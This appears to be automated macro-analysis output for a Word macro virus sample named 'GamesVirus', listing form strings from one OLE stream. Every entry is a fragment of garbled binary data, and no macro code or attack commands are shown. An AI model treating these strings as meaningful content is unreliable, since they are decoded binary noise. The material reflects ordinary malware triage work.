- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
8BAAJI8BI798
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.GamesVirus' - OLE stream: 'Macros/UserForm1/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
 IJI\cYmki$! 	
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.GamesVirus' - OLE stream: 'Macros/UserForm1/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
$!(.10���
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.GamesVirus' - OLE stream: 'Macros/UserForm1/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
%)($! 
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.GamesVirus' - OLE stream: 'Macros/UserForm1/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
%) $! 
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.GamesVirus' - OLE stream: 'Macros/UserForm1/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
!I%)A%)I
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.GamesVirus' - OLE stream: 'Macros/UserForm1/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
!I$!Q.1I.1I
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.GamesVirus' - OLE stream: 'Macros/UserForm1/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
!Y%)Y
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.GamesVirus' - OLE stream: 'Macros/UserForm1/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
!Y%)a
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.GamesVirus' - OLE stream: 'Macros/UserForm1/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
$!($! 
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.GamesVirus' - OLE stream: 'Macros/UserForm1/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
9Y)Ja!Ji)Ja<cq;Zi)Ja BY+Zi!Ja
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.GamesVirus' - OLE stream: 'Macros/UserForm1/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
9a!Ja!Ji)Ji)JaFs�<c�_{�=ky(BYMkqMkyNsy(BY;ZiCZi BQ BY1JY(BQ)JY)JYCZi'9I
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.GamesVirus' - OLE stream: 'Macros/UserForm1/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
1A&1A
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.GamesVirus' - OLE stream: 'Macros/UserForm1/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
!0&1A
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.GamesVirus' - OLE stream: 'Macros/UserForm1/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
0%)0%)8
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.GamesVirus' - OLE stream: 'Macros/UserForm1/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
.10\ca\cYRRQ@BA$! 	
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.GamesVirus' - OLE stream: 'Macros/UserForm1/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
$! .10%)(���
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.GamesVirus' - OLE stream: 'Macros/UserForm1/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
$! $! 
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.GamesVirus' - OLE stream: 'Macros/UserForm1/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
!Q%)Q
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.GamesVirus' - OLE stream: 'Macros/UserForm1/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
!I61I$!Q%)I.1I.1I
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.GamesVirus' - OLE stream: 'Macros/UserForm1/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
!Q$!Q$!Y
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.GamesVirus' - OLE stream: 'Macros/UserForm1/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
!Q%)Y
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.GamesVirus' - OLE stream: 'Macros/UserForm1/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
!Q%)Y
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.GamesVirus' - OLE stream: 'Macros/UserForm1/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
!Y%)Y.1i%)a
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.GamesVirus' - OLE stream: 'Macros/UserForm1/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
%)($! !Ja)Ja
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.GamesVirus' - OLE stream: 'Macros/UserForm1/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
1Q;Zq_{y<cyP��3Zq Ba Ba3Zi
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.GamesVirus' - OLE stream: 'Macros/UserForm1/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
9Y)Ja
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.GamesVirus' - OLE stream: 'Macros/UserForm1/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
1QMk�Ek�NsyW{�EkyEkyMky!Ja2Ra
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.GamesVirus' - OLE stream: 'Macros/UserForm1/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
1I BQ(BQ'9I'9I)JY(BQ BI'9Q
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.GamesVirus' - OLE stream: 'Macros/UserForm1/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
$! $! 
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.GamesVirus' - OLE stream: 'Macros/UserForm1/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
)8.1A
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.GamesVirus' - OLE stream: 'Macros/UserForm1/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
! RRQ[ZY%)(
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.GamesVirus' - OLE stream: 'Macros/UserForm1/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
.10$!(���
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.GamesVirus' - OLE stream: 'Macros/UserForm1/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
! $! 	
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.GamesVirus' - OLE stream: 'Macros/UserForm1/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
!A-)I
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.GamesVirus' - OLE stream: 'Macros/UserForm1/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
!I$!I$!I%)Q%)I
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.GamesVirus' - OLE stream: 'Macros/UserForm1/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
!Q$!Y%)Y%)Y
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.GamesVirus' - OLE stream: 'Macros/UserForm1/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
! %)(	
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.GamesVirus' - OLE stream: 'Macros/UserForm1/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
*Ri*Ri
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.GamesVirus' - OLE stream: 'Macros/UserForm1/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
Ba'9Q*RiDcyEk�O{�3Zq
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.GamesVirus' - OLE stream: 'Macros/UserForm1/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
1Q3Zq
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.GamesVirus' - OLE stream: 'Macros/UserForm1/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
9Q+Zq
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.GamesVirus' - OLE stream: 'Macros/UserForm1/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
1Q*Rq<cy+Zq^sqEkyDcy)Ja BQ BQ
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.GamesVirus' - OLE stream: 'Macros/UserForm1/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
1I BI2Ra1JY*RY'9A
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.GamesVirus' - OLE stream: 'Macros/UserForm1/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
.10$! 
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.GamesVirus' - OLE stream: 'Macros/UserForm1/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
 $!8-)A
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.GamesVirus' - OLE stream: 'Macros/UserForm1/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
!A79I
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.GamesVirus' - OLE stream: 'Macros/UserForm1/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
7988BA
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.GamesVirus' - OLE stream: 'Macros/UserForm1/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
!I$!I
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.GamesVirus' - OLE stream: 'Macros/UserForm1/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
%)($! 
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.GamesVirus' - OLE stream: 'Macros/UserForm1/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
$! $! 	
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.GamesVirus' - OLE stream: 'Macros/UserForm1/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
$! .10
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.GamesVirus' - OLE stream: 'Macros/UserForm1/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
Ba<cy!Ji
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.GamesVirus' - OLE stream: 'Macros/UserForm1/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
9Y3Zq"RiG{�3Zq"Ri*Ry
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.GamesVirus' - OLE stream: 'Macros/UserForm1/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
9Q BQ
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.GamesVirus' - OLE stream: 'Macros/UserForm1/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
9QMk�4ci;Zq<cqVsq+Zi BY2Ri)Ja
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.GamesVirus' - OLE stream: 'Macros/UserForm1/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
)A BQ:RY2Ra:Ra'9I'9Q
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.GamesVirus' - OLE stream: 'Macros/UserForm1/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
.10$! 	
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.GamesVirus' - OLE stream: 'Macros/UserForm1/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
(.1A$!8
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.GamesVirus' - OLE stream: 'Macros/UserForm1/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
!I%)Y&1Y'9Q%)0
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.GamesVirus' - OLE stream: 'Macros/UserForm1/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
$! $! 
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.GamesVirus' - OLE stream: 'Macros/UserForm1/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
!Q$!Q
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.GamesVirus' - OLE stream: 'Macros/UserForm1/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
%) %)(
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.GamesVirus' - OLE stream: 'Macros/UserForm1/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
$! $! $!
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.GamesVirus' - OLE stream: 'Macros/UserForm1/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
-)($! 
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.GamesVirus' - OLE stream: 'Macros/UserForm1/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
 Bi3Zq
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.GamesVirus' - OLE stream: 'Macros/UserForm1/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
9YEk�
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.GamesVirus' - OLE stream: 'Macros/UserForm1/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
Bag{�4c�a��3Zy Bi
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.GamesVirus' - OLE stream: 'Macros/UserForm1/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
BY*Ry*Rq
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.GamesVirus' - OLE stream: 'Macros/UserForm1/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
1I Ba
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.GamesVirus' - OLE stream: 'Macros/UserForm1/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
)A'9aDcq3ZiDcqMky)Ja BY)JY)JY(BQ
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.GamesVirus' - OLE stream: 'Macros/UserForm1/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
)A)JY BQ(BQ:RY BQ
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.GamesVirus' - OLE stream: 'Macros/UserForm1/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
(.1Y'9Y
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.GamesVirus' - OLE stream: 'Macros/UserForm1/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
! $! 
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.GamesVirus' - OLE stream: 'Macros/UserForm1/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
-)($! 	
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.GamesVirus' - OLE stream: 'Macros/UserForm1/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
-)(%) $!
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.GamesVirus' - OLE stream: 'Macros/UserForm1/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
9Yr��)Ja
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.GamesVirus' - OLE stream: 'Macros/UserForm1/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
BaUkq4cyP��Ns�*Rq
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.GamesVirus' - OLE stream: 'Macros/UserForm1/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
BY*Rq
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.GamesVirus' - OLE stream: 'Macros/UserForm1/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
9QEky<cy Ba
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.GamesVirus' - OLE stream: 'Macros/UserForm1/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
9Y BQ)JY
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.GamesVirus' - OLE stream: 'Macros/UserForm1/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
)A'9Q)JY(BQ:Ra'9I'9I
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.GamesVirus' - OLE stream: 'Macros/UserForm1/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
1A&1A&1I
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.GamesVirus' - OLE stream: 'Macros/UserForm1/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
18&18&18
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.GamesVirus' - OLE stream: 'Macros/UserForm1/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
(.1Q%)A
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.GamesVirus' - OLE stream: 'Macros/UserForm1/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
!A%)a
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.GamesVirus' - OLE stream: 'Macros/UserForm1/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
$! AJI
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.GamesVirus' - OLE stream: 'Macros/UserForm1/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
! 8B8	
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.GamesVirus' - OLE stream: 'Macros/UserForm1/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
! ,!(	
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.GamesVirus' - OLE stream: 'Macros/UserForm1/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
%)($! 
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.GamesVirus' - OLE stream: 'Macros/UserForm1/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
$! -)(
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.GamesVirus' - OLE stream: 'Macros/UserForm1/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
%)(-)(
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.GamesVirus' - OLE stream: 'Macros/UserForm1/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
)JaCZq<c�*Rao{�
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.GamesVirus' - OLE stream: 'Macros/UserForm1/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
)A>s�CZiO{�*Ri
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.GamesVirus' - OLE stream: 'Macros/UserForm1/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
9Y)Ja*Ri
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.GamesVirus' - OLE stream: 'Macros/UserForm1/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
1Q'9a
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.GamesVirus' - OLE stream: 'Macros/UserForm1/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
BYDcq3Zy!Ja!JY)Ji BY(BY(BY'9Y&1QKZi1JY2Ra/9Q
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.GamesVirus' - OLE stream: 'Macros/UserForm1/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
1A&1A&1A&1A
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.GamesVirus' - OLE stream: 'Macros/UserForm1/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
)A&18
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.GamesVirus' - OLE stream: 'Macros/UserForm1/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
AJI$! 
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.GamesVirus' - OLE stream: 'Macros/UserForm1/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
%) $! %) 
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.GamesVirus' - OLE stream: 'Macros/UserForm1/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
8BA610-)(@B8-)(-)(AJIAJI$! 8BAJRQ.102RiO{�'9Q)Ja3Zi
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.GamesVirus' - OLE stream: 'Macros/UserForm1/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
)0O{�+Zq*Ri+Zq
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.GamesVirus' - OLE stream: 'Macros/UserForm1/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
Ba"Ri Ba
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.GamesVirus' - OLE stream: 'Macros/UserForm1/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
BY)Ja BY
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.GamesVirus' - OLE stream: 'Macros/UserForm1/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
9Y BY
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.GamesVirus' - OLE stream: 'Macros/UserForm1/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
1Q BQ*Ra'9Y&1ICZi:Ra)JY'9I/9Q
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.GamesVirus' - OLE stream: 'Macros/UserForm1/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
)8&1A
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.GamesVirus' - OLE stream: 'Macros/UserForm1/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
1A&1A
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.GamesVirus' - OLE stream: 'Macros/UserForm1/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
!879Y
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.GamesVirus' - OLE stream: 'Macros/UserForm1/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
$! %)(
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.GamesVirus' - OLE stream: 'Macros/UserForm1/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
$! $! 
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.GamesVirus' - OLE stream: 'Macros/UserForm1/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
! -)(
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.GamesVirus' - OLE stream: 'Macros/UserForm1/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
-)(%)(
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.GamesVirus' - OLE stream: 'Macros/UserForm1/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
$! $!(%) ?98$! #
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.GamesVirus' - OLE stream: 'Macros/UserForm1/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
 -)(AJI.1(,! 
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.GamesVirus' - OLE stream: 'Macros/UserForm1/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
X��4cq3ZqDciNsy=k�*Ra=k� BY
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.GamesVirus' - OLE stream: 'Macros/UserForm1/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
9Q!Ji Ba
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.GamesVirus' - OLE stream: 'Macros/UserForm1/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
9a Ba
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.GamesVirus' - OLE stream: 'Macros/UserForm1/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
)A Ba
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.GamesVirus' - OLE stream: 'Macros/UserForm1/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
Ba BY)Ji!Ja
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.GamesVirus' - OLE stream: 'Macros/UserForm1/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
1I BQ BQ!JY
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.GamesVirus' - OLE stream: 'Macros/UserForm1/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
!82RaCZa(BY&1A&1I'9I
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.GamesVirus' - OLE stream: 'Macros/UserForm1/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
!(&1A
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.GamesVirus' - OLE stream: 'Macros/UserForm1/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
-)0798
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.GamesVirus' - OLE stream: 'Macros/UserForm1/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
!8%)8
-------------------------------------------------------------------------------
